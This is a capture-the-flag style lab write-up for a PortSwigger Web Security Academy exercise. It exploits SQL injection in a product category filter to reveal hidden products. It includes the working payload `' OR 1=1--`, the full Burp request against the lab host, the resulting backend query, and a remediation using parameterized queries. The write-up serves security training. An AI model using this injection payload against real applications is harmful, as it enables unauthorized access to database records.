# Lab 01: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection (SQLi)
- **Difficulty:** Apprentice
- **OWASP Top 10:** A03:2021 – Injection
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **Author:** Yaseen Khan
- **Date:** November 20, 2026

---

## 1. Objective
Exploit an in-band SQL injection vulnerability in the product category filter to bypass the backend `released = 1` visibility restriction and display all unreleased (hidden) products in the storefront.

---

## 2. Reconnaissance & Vulnerability Discovery
- **Target Endpoint:** `GET /filter?category=Gifts`
- **Vulnerable Parameter:** `category` (URL Query Parameter)

### Initial Probe
1. Navigated to the **Gifts** product category on the storefront and intercepted the request in **Burp Proxy**.
2. Sent the request to **Burp Repeater** (`Ctrl + R`) and appended a single quote (`'`) to the `category` parameter (`GET /filter?category=Gifts'`) to test how the application handles SQL syntax characters.
3. The server returned an **HTTP 500 Internal Server Error**, confirming that user-supplied input is concatenated directly into the backend SQL query without sanitization or parameterization.

**Inferred Backend SQL Query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

## Exploitation & Proof of Concept (PoC)
To retrieve hidden items, the payload must:

Close the original string literal using a single quote (').

Append an always-true condition (OR 1=1) so the WHERE clause evaluates to TRUE for every row in the products table.

Comment out the remainder of the original query (AND released = 1) using the SQL double-dash comment sequence (--).

## Modified HTTP Request (Burp Repeater)
GET /filter?category=Gifts' OR 1=1-- HTTP/2
Host: 0a6d004d042d33c0827f1abd00b00083.web-security-academy.net
Cookie: session=[REDACTED]
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: [https://0a6d004d042d33c0827f1abd00b00083.web-security-academy.net/](https://0a6d004d042d33c0827f1abd00b00083.web-security-academy.net/)
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

Resulting SQL Query Executed on Backend:

SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

## Proof of Exploitation Screenshots
1. Burp Repeater Payload & HTTP 200 OK Response (Content-Length: 11600):

2. Application Storefront Displaying Hidden Products & Lab Completion Banner:

## Impact
An unauthenticated attacker can bypass business-logic filters to enumerate unpublished products, internal pricing, or sensitive records stored within the queried database table.

## Remediation
Primary Fix (Parameterized Queries): Use prepared statements with bound parameters so the database engine treats user input strictly as literal data rather than executable SQL syntax:

cursor.execute("SELECT * FROM products WHERE category = %s AND released = 1", (category,))
Defense in Depth: Implement strict allowlist validation on the category parameter against known valid category names before querying the database.
